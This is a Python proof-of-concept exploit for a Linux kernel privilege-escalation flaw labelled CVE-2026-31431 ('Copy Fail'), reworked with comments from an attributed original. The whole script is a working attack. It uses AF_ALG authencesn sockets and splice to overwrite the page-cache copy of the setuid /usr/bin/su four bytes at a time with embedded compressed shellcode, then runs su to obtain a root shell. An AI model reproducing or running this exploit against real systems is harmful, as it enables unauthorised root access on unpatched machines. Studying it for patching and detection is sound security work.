#!/usr/bin/env python3
"""
PoC for CVE-2026-31431 ("Copy Fail").

Uses authencesn's 4-byte scratch write past the AEAD output region to
corrupt the page-cache copy of /usr/bin/su, then execs su to run the
injected shellcode as root.

Originally from https://github.com/theori-io/copy-fail-CVE-2026-31431
Explained in a video on Youtube: https://www.youtube.com/watch?v=MaFK5AXpXXw
Modified by ME (mike@erdelynet.com) with comments and a little cleanup
"""

# original code: import os as g,zlib,socket as s
import os
import socket
import zlib

# Constants the kernel doesn't expose nicely from Python.
AF_ALG         = 38
# original code: h=279
SOL_ALG        = 279
ALG_SET_KEY    = 1
ALG_SET_IV     = 2
ALG_SET_OP     = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
# original code: i=d('00')

TARGET = "/usr/bin/su"
ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"

# 96-byte all-zero key + 8-byte ESN header. Cypher is bogus on purpose;
# we don't care that HMAC fails, we only care about the side-effect write.
KEY = bytes.fromhex("0800010000000010" + "00" * 32)
IV  = b"\x10" + b"\x00" * 19
ASSOCLEN_CMSG = b"\x08" + b"\x00" * 3   # assoclen = 8

# Shellcode that spawns a root shell. Compressed to keep the PoC tiny.
# original code: def d(x):return bytes.fromhex(x)
SHELLCODE_GZ = bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
)

# original code: def c(f,t,c):
def write_four_bytes(target_fd: int, file_offset: int, four_bytes: bytes) -> None:
    """
    Trigger one 4-byte write into the page cache of `target_fd`
    at `file_offset`, with contents `four_bytes`.

    Mechanism:
      - sendmsg supplies AAD; bytes 4..8 of AAD become the seqno_lo
        that authencesn writes as scratch at dst[assoclen + cryptlen].
      - splice puts page-cache references to the target file into the
        TX scatterlist. The in-place AEAD setup chains the tag region
        of TX onto the destination SGL, so the scratch write lands
        inside the file's cached page.
    """
    # original code: a=s.socket(38,5,0)
    sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    # original code: a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
    sock.bind(("aead", ALG_NAME))

    # Key + tag size. Values are arbitrary; we just need the bind to succeed.
    # original code: v=a.setsockopt
    # original code: v(h,1,d('0800010000000010'+'0'*64))
    sock.setsockopt(SOL_ALG, ALG_SET_KEY, KEY)
    # original code: v(h,5,None,4)
    sock.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)

    # original code: u,_=a.accept()
    op_sock, _ = sock.accept()

    # AAD layout: [4 pad bytes][4 payload bytes] - the payload bytes are
    # what authencesn ends up writing at dst[assoclen + cryptlen].
    aad_plus_payload = b"A" * 4 + four_bytes

    # original code: u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768)
    op_sock.sendmsg(
        [aad_plus_payload],
        [
            (SOL_ALG, ALG_SET_OP,             b"\x00" * 4),    # decrypt
            (SOL_ALG, ALG_SET_IV,             IV),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN,  ASSOCLEN_CMSG),
        ],
        socket.MSG_MORE,
    )

    # Splice the target file through a pipe into the AF_ALG socket.
    # splice_offset = file_offset + 4 places the eventual scratch write
    # exactly at file_offset.
    # original code: o=t+4
    splice_offset = file_offset + 4
    # original code: r,w=g.pipe()
    pipe_r, pipe_w = os.pipe()
    # original code: n=g.splice
    # original code: n(f,w,o,offset_src=0)
    os.splice(target_fd, pipe_w, splice_offset, offset_src=0)
    # original code: n(r,u.fileno(),o)
    os.splice(pipe_r, op_sock.fileno(), splice_offset)

    # Trigger the decrypt. HMAC will fail (-EBADMSG) but the scratch
    # write into the page cache has already happened and is not undone.
    # original code: try:u.recv(8+t)
    try:
        op_sock.recv(8 + file_offset)
    # original code: except:0
    except OSError:
        pass

def main() -> None:
    # original code: f=g.open("/usr/bin/su",0)
    target_fd = os.open(TARGET, os.O_RDONLY)
    # original code: e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
    shellcode = zlib.decompress(SHELLCODE_GZ)

    # Lay shellcode down 4 bytes at a time.
    # original code: i=0
    # original code: while i<len(e):c(f,i,e[i:i+4]);i+=4
    for offset in range(0, len(shellcode), 4):
        write_four_bytes(target_fd, offset, shellcode[offset:offset + 4])

    # Page-cache copy of /usr/bin/su now contains shellcode. su is setuid
    # root, so execve runs the shellcode as uid 0.
    # original code: g.system("su")
    os.system(os.path.basename(TARGET))

if __name__ == "__main__":
    main()

